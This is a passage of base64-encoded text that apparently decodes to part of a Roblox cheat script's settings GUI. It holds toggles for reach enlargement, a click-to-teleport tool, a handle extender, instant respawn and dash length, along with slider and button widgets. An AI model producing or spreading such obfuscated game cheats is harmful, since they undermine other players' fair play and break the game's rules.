lJlYWNoU2l6ZSA9IDEKICAgICAgICAgICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJSZWFjaCJdIHRoZW4gVG9nZ2xlQnV0dG9uc1siUmVhY2giXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgSW5wdXRCb3hlc1siUmVhY2hTaXplIl0gdGhlbiBJbnB1dEJveGVzWyJSZWFjaFNpemUiXS5UZXh0ID0gIjEiIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgY29uZmlnS2V5ID09ICJUZWxlcG9ydFRvb2wiIHRoZW4KICAgICAgICAgICAgICAgIGlmIENvbmZpZy5UZWxlcG9ydFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBJbnN0YW5jZS5uZXcoIlRvb2wiKQogICAgICAgICAgICAgICAgICAgIHRvb2wuTmFtZSA9ICJFUE90ZWxlcG9ydGVyIgogICAgICAgICAgICAgICAgICAgIHRvb2wuUmVxdWlyZXNIYW5kbGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIHRvb2wuVG9vbFRpcCA9ICJDbGljayB0byBUZWxlcG9ydCIKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB0b29sLkFjdGl2YXRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBocnAgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG0gPSBwbGF5ZXI6R2V0TW91c2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHJwIGFuZCBtIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRQb3MgPSBtLkhpdC5wCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgb3JpZ2luYWxMb29rID0gaHJwLkNGcmFtZS5Mb29rVmVjdG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLkNoYXJhY3RlcjpQaXZvdFRvKENGcmFtZS5uZXcodGFyZ2V0UG9zKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBocnAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyh0YXJnZXRQb3MsIHRhcmdldFBvcyArIG9yaWdpbmFsTG9vaykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBwbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBpZiBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkVQT3RlbGVwb3J0ZXIiKSB0aGVuIHBsYXllci5CYWNrcGFjay5FUE90ZWxlcG9ydGVyOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJFUE90ZWxlcG9ydGVyIikgdGhlbiBwbGF5ZXIuQ2hhcmFjdGVyLkVQT3RlbGVwb3J0ZXI6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgY29uZmlnS2V5ID09ICJEYXNoTGVuZ3RoRW5hYmxlZCIgYW5kIG5vdCBDb25maWcuRGFzaExlbmd0aEVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXI6U2V0QXR0cmlidXRlKCJEYXNoTGVuZ3RoIiwgMSkKICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXI6U2V0QXR0cmlidXRlKCJEYXNoTGVuZ3RoQWlyIiwgMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiRGlzYWJsZVNub3ciIHRoZW4KICAgICAgICAgICAgICAgIGlmIF9HLlNub3dHdWkgdGhlbgogICAgICAgICAgICAgICAgICAgIF9HLlNub3dHdWkuRW5hYmxlZCA9IG5vdCBDb25maWcuRGlzYWJsZVNub3cKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgVXBkYXRlTG9hZGVyU2V0dGluZ3MoKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiQXV0b0xvYWRDb25maWciIHRoZW4KICAgICAgICAgICAgICAgIFVwZGF0ZUxvYWRlclNldHRpbmdzKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBJbnN0YW50IFJlc3Bhd24gdG9nZ2xlIGJpbmRpbmcKICAgICAgICAgICAgaWYgY29uZmlnS2V5ID09ICJJbnN0YW50UmVzcGF3biIgdGhlbgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLkluc3RhbnRSZXNwYXduIHRoZW4KICAgICAgICAgICAgICAgICAgICBCaW5kSW5zdGFudFJlc3Bhd24oKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGlmIGluc3RhbnRSZXNwYXduQ29ubiB0aGVuIGluc3RhbnRSZXNwYXduQ29ubjpEaXNjb25uZWN0KCk7IGluc3RhbnRSZXNwYXduQ29ubiA9IG5pbCBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiSGFuZGxlRXh0ZW5kZXIiIGFuZCBub3QgQ29uZmlnLkhhbmRsZUV4dGVuZGVyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIHJlc3RvcmVIYW5kbGUodG9vbCkKICAgICAgICAgICAgICAgICAgICBpZiB0b29sIGFuZCB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gcGFpcnModG9vbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgYW5kIHBhcnQ6R2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5TaXplID0gcGFydDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydDpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIsIG5pbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHQgaW4gcGFpcnMocGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbyByZXN0b3JlSGFuZGxlKHQpIGVuZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGFybVBhcnRzID0geyJMZWZ0IEFybSIsICJSaWdodCBBcm0iLCAiTGVmdCBMZWciLCAiUmlnaHQgTGVnIiwgIkxlZnRIYW5kIiwgIlJpZ2h0SGFuZCIsICJMZWZ0TG93ZXJBcm0iLCAiTGVmdFVwcGVyQXJtIiwgIlJpZ2h0TG93ZXJBcm0iLCAiUmlnaHRVcHBlckFybSIsICJMZWZ0TG93ZXJMZWciLCAiTGVmdFVwcGVyTGVnIiwgIkxlZnRGb290IiwgIlJpZ2h0TG93ZXJMZWciLCAiUmlnaHRVcHBlckxlZyIsICJSaWdodEZvb3QifQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBuYW1lIGluIHBhaXJzKGFybVBhcnRzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwYXJ0ID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChuYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwYXJ0IGFuZCBwYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgcGFydDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuU2l6ZSA9IHBhcnQ6R2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydDpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIsIG5pbCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIHBsYXllci5CYWNrcGFjayB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHQgaW4gcGFpcnMocGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvIHJlc3RvcmVIYW5kbGUodCkgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZUN5Y2xlKHBhcmVudCwgdGV4dCwgY29uZmlnS2V5LCBvcHRpb25zLCBvcmRlcikKICAgICAgICBsb2NhbCBGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgRnJhbWUuTGF5b3V0T3JkZXIgPSBvcmRlcgogICAgICAgIEZyYW1lLlBhcmVudCA9IHBhcmVudAoKICAgICAgICBsb2NhbCBDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykKICAgICAgICBDb3JuZXIuUGFyZW50ID0gRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgICAgICBTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigzNSwgMzUsIDQ1KQogICAgICAgIFN0cm9rZS5UaGlja25lc3MgPSAxCiAgICAgICAgU3Ryb2tlLlBhcmVudCA9IEZyYW1lCgogICAgICAgIGxvY2FsIExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIExhYmVsLlRleHQgPSB0ZXh0CiAgICAgICAgTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLjYsIDAsIDEsIDApCiAgICAgICAgTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICBMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbU1lZGl1bQogICAgICAgIExhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgTGFiZWwuVGV4dFNpemUgPSA5CiAgICAgICAgTGFiZWwuUGFyZW50ID0gRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBQYWQgPSBJbnN0YW5jZS5uZXcoIlVJUGFkZGluZyIpCiAgICAgICAgUGFkLlBhZGRpbmdMZWZ0ID0gVURpbS5uZXcoMCwgMTApCiAgICAgICAgUGFkLlBhcmVudCA9IExhYmVsCgogICAgICAgIGxvY2FsIEJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMC4zNSwgMCwgMC43LCAwKQogICAgICAgIEJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjYyLCAwLCAwLjE1LCAwKQogICAgICAgIEJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgICAgICBCdXR0b24uVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgQnV0dG9uLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIEJ1dHRvbi5UZXh0U2l6ZSA9IDgKICAgICAgICBCdXR0b24uVGV4dCA9IENvbmZpZ1tjb25maWdLZXldCiAgICAgICAgQnV0dG9uLlBhcmVudCA9IEZyYW1lCgogICAgICAgIGxvY2FsIEJDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBCQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICAgICAgQkNvcm5lci5QYXJlbnQgPSBCdXR0b24KCiAgICAgICAgQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBjdXJyZW50SW5kZXggPSAxCiAgICAgICAgICAgIGZvciBpLCB2IGluIGlwYWlycyhvcHRpb25zKSBkbwogICAgICAgICAgICAgICAgaWYgdiA9PSBDb25maWdbY29uZmlnS2V5XSB0aGVuIGN1cnJlbnRJbmRleCA9IGkgYnJlYWsgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBjdXJyZW50SW5kZXggPSBjdXJyZW50SW5kZXggKyAxCiAgICAgICAgICAgIGlmIGN1cnJlbnRJbmRleCA+ICNvcHRpb25zIHRoZW4gY3VycmVudEluZGV4ID0gMSBlbmQKICAgICAgICAgICAgQ29uZmlnW2NvbmZpZ0tleV0gPSBvcHRpb25zW2N1cnJlbnRJbmRleF0KICAgICAgICAgICAgQnV0dG9uLlRleHQgPSBDb25maWdbY29uZmlnS2V5XQogICAgICAgIGVuZCkKICAgICAgICByZXR1cm4gQnV0dG9uCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiByZXN0b3JlVG9vbENvbG9yKHRvb2wpCiAgICAgICAgaWYgbm90IHRvb2wgb3Igbm90IHRvb2w6SXNBKCJUb29sIikgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgZm9yIF8sIGRlc2NlbmRhbnQgaW4gcGFpcnModG9vbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBkZXNjZW5kYW50OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBvcmlnaW5hbENvbG9yID0gZGVzY2VuZGFudDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsQ29sb3IiKQogICAgICAgICAgICAgICAgaWYgb3JpZ2luYWxDb2xvciB0aGVuCiAgICAgICAgICAgICAgICAgICAgZGVzY2VuZGFudC5Db2xvciA9IG9yaWdpbmFsQ29sb3IKICAgICAgICAgICAgICAgICAgICBkZXNjZW5kYW50OlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxDb2xvciIsIG5pbCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlaWYgZGVzY2VuZGFudDpJc0EoIlBhcnRpY2xlRW1pdHRlciIpIG9yIGRlc2NlbmRhbnQ6SXNBKCJUcmFpbCIpIG9yIGRlc2NlbmRhbnQ6SXNBKCJCZWFtIikgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgb3JpZ2luYWxDUyA9IGRlc2NlbmRhbnQ6R2V0QXR0cmlidXRlKCJPcmlnaW5hbENvbG9yU2VxdWVuY2UiKQogICAgICAgICAgICAgICAgaWYgb3JpZ2luYWxDUyB0aGVuCiAgICAgICAgICAgICAgICAgICAgZGVzY2VuZGFudC5Db2xvciA9IG9yaWdpbmFsQ1MKICAgICAgICAgICAgICAgICAgICBkZXNjZW5kYW50OlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxDb2xvclNlcXVlbmNlIiwgbmlsKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2VpZiBkZXNjZW5kYW50OklzQSgiTGlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBvcmlnaW5hbExpZ2h0Q29sb3IgPSBkZXNjZW5kYW50OkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxMaWdodENvbG9yIikKICAgICAgICAgICAgICAgIGlmIG9yaWdpbmFsTGlnaHRDb2xvciB0aGVuCiAgICAgICAgICAgICAgICAgICAgZGVzY2VuZGFudC5Db2xvciA9IG9yaWdpbmFsTGlnaHRDb2xvcgogICAgICAgICAgICAgICAgICAgIGRlc2NlbmRhbnQ6U2V0QXR0cmlidXRlKCJPcmlnaW5hbExpZ2h0Q29sb3IiLCBuaWwpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBjcmVhdGVTbGlkZXIocGFyZW50LCB0ZXh0LCBjb25maWdLZXksIG9yZGVyLCBtaW4sIG1heCwgZGVmYXVsdCkKICAgICAgICBDb25maWdbY29uZmlnS2V5XSA9IENvbmZpZ1tjb25maWdLZXldIG9yIGRlZmF1bHQKCiAgICAgICAgbG9jYWwgRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDQwKQogICAgICAgIEZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgIEZyYW1lLkxheW91dE9yZGVyID0gb3JkZXIKICAgICAgICBGcmFtZS5QYXJlbnQgPSBwYXJlbnQKCiAgICAgICAgbG9jYWwgQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICAgICAgQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICAgICAgQ29ybmVyLlBhcmVudCA9IEZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCiAgICAgICAgU3Ryb2tlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMzUsIDM1LCA0NSkKICAgICAgICBTdHJva2UuVGhpY2tuZXNzID0gMQogICAgICAgIFN0cm9rZS5QYXJlbnQgPSBGcmFtZQoKICAgICAgICBsb2NhbCBMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICBMYWJlbC5UZXh0ID0gdGV4dAogICAgICAgIExhYmVsLlNpemUgPSBVRGltMi5uZXcoMC43LCAwLCAwLCAyMCkKICAgICAgICBMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgICAgIExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1NZWRpdW0KICAgICAgICBMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgIExhYmVsLlRleHRTaXplID0gOQogICAgICAgIExhYmVsLlBhcmVudCA9IEZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgUGFkID0gSW5zdGFuY2UubmV3KCJVSVBhZGRpbmciKQogICAgICAgIFBhZC5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDEwKQogICAgICAgIFBhZC5QYXJlbnQgPSBMYWJlbAoKICAgICAgICBsb2NhbCBWYWx1ZUxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIFZhbHVlTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLjMsIC0xMCwgMCwgMjApCiAgICAgICAgVmFsdWVMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjcsIDAsIDAsIDApCiAgICAgICAgVmFsdWVMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIFZhbHVlTGFiZWwuVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgVmFsdWVMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgICAgIFZhbHVlTGFiZWwuVGV4dFNpemUgPSA4CiAgICAgICAgVmFsdWVMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuUmlnaHQKICAgICAgICBWYWx1ZUxhYmVsLlBhcmVudCA9IEZyYW1lCgogICAgICAgIGxvY2FsIFNsaWRlckJhY2sgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBTbGlkZXJCYWNrLlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAwLCA0KQogICAgICAgIFNsaWRlckJhY2suUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDI1KQogICAgICAgIFNsaWRlckJhY2suQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgU2xpZGVyQmFjay5QYXJlbnQgPSBGcmFtZQogICAgICAgIGxvY2FsIFNCQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIFNCQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsMCkgU0JDb3JuZXIuUGFyZW50ID0gU2xpZGVyQmFjawoKICAgICAgICBsb2NhbCBTbGlkZXJGcm9udCA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIFNsaWRlckZyb250LlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMSwgMCkKICAgICAgICBTbGlkZXJGcm9udC5CYWNrZ3JvdW5kQ29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICBTbGlkZXJGcm9udC5QYXJlbnQgPSBTbGlkZXJCYWNrCiAgICAgICAgbG9jYWwgU0ZDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgU0ZDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwwKSBTRkNvcm5lci5QYXJlbnQgPSBTbGlkZXJGcm9udAoKICAgICAgICBsb2NhbCBUaHVtYiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgVGh1bWIuU2l6ZSA9IFVEaW0yLm5ldygwLCAxMiwgMCwgMTIpCiAgICAgICAgVGh1bWIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgVGh1bWIuVGV4dCA9ICIiCiAgICAgICAgVGh1bWIuWkluZGV4ID0gMgogICAgICAgIFRodW1iLlBhcmVudCA9IFNsaWRlckJhY2sgLS0gUGFyZW50IHRvIFNsaWRlckJhY2ssIG5vdCBTbGlkZXJGcm9udAogICAgICAgIGxvY2FsIFRDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgVENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygxLDApIFRDb3JuZXIuUGFyZW50ID0gVGh1bWIKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gdXBkYXRlU2xpZGVyRnJvbVZhbHVlKHZhbHVlKQogICAgICAgICAgICBsb2NhbCBwZXJjZW50YWdlID0gKHZhbHVlIC0gbWluKSAvIChtYXggLSBtaW4pCiAgICAgICAgICAgIHBlcmNlbnRhZ2UgPSBtYXRoLmNsYW1wKHBlcmNlbnRhZ2UsIDAsIDEpCiAgICAgICAgICAgIFNsaWRlckZyb250LlNpemUgPSBVRGltMi5uZXcocGVyY2VudGFnZSwgMCwgMSwgMCkKICAgICAgICAgICAgLS0gUG9zaXRpb24gdGh1bWIgYXQgdGhlIHJpZ2h0IGVkZ2Ugb2YgU2xpZGVyRnJvbnQKICAgICAgICAgICAgVGh1bWIuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgbWF0aC5mbG9vcihTbGlkZXJCYWNrLkFic29sdXRlU2l6ZS5YICogcGVyY2VudGFnZSAtIDYpLCAwLjUsIC02KQogICAgICAgICAgICBWYWx1ZUxhYmVsLlRleHQgPSBzdHJpbmcuZm9ybWF0KCIlLjJmIiwgdmFsdWUpCiAgICAgICAgICAgIENvbmZpZ1tjb25maWdLZXldID0gdmFsdWUKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gdXBkYXRlU2xpZGVyRnJvbVBvc2l0aW9uKGlucHV0KQogICAgICAgICAgICBsb2NhbCBtb3VzZVBvcyA9IGlucHV0LlBvc2l0aW9uCiAgICAgICAgICAgIGxvY2FsIHJlbGF0aXZlUG9zID0gbW91c2VQb3MuWCAtIFNsaWRlckJhY2suQWJzb2x1dGVQb3NpdGlvbi5YCiAgICAgICAgICAgIGxvY2FsIHBlcmNlbnRhZ2UgPSBtYXRoLmNsYW1wKHJlbGF0aXZlUG9zIC8gU2xpZGVyQmFjay5BYnNvbHV0ZVNpemUuWCwgMCwgMSkKICAgICAgICAgICAgbG9jYWwgbmV3VmFsdWUgPSBtaW4gKyAobWF4IC0gbWluKSAqIHBlcmNlbnRhZ2UKICAgICAgICAgICAgdXBkYXRlU2xpZGVyRnJvbVZhbHVlKG5ld1ZhbHVlKQogICAgICAgIGVuZAoKICAgICAgICB1cGRhdGVTbGlkZXJGcm9tVmFsdWUoQ29uZmlnW2NvbmZpZ0tleV0pCgogICAgICAgIFRodW1iLklucHV0" .. "QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIG9yIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGRyYWdDb25uLCByZWxlYXNlQ29ubgogICAgICAgICAgICAgICAgZHJhZ0Nvbm4gPSBVc2VySW5wdXRTZXJ2aWNlLklucHV0Q2hhbmdlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYW5nZWRJbnB1dCkKICAgICAgICAgICAgICAgICAgICBpZiBjaGFuZ2VkSW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VNb3ZlbWVudCBvciBjaGFuZ2VkSW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVTbGlkZXJGcm9tUG9zaXRpb24oY2hhbmdlZElucHV0KQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgcmVsZWFzZUNvbm4gPSBVc2VySW5wdXRTZXJ2aWNlLklucHV0RW5kZWQ6Q29ubmVjdChmdW5jdGlvbihlbmRlZElucHV0KQogICAgICAgICAgICAgICAgICAgIGlmIGVuZGVkSW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIG9yIGVuZGVkSW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBkcmFnQ29ubjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgcmVsZWFzZUNvbm46RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICByZXR1cm4gRnJhbWUKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZUluZm8ocGFyZW50LCB0ZXh0LCBvcmRlcikKICAgICAgICBsb2NhbCBMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICBMYWJlbC5UZXh0ID0gdGV4dAogICAgICAgIExhYmVsLlNpemUgP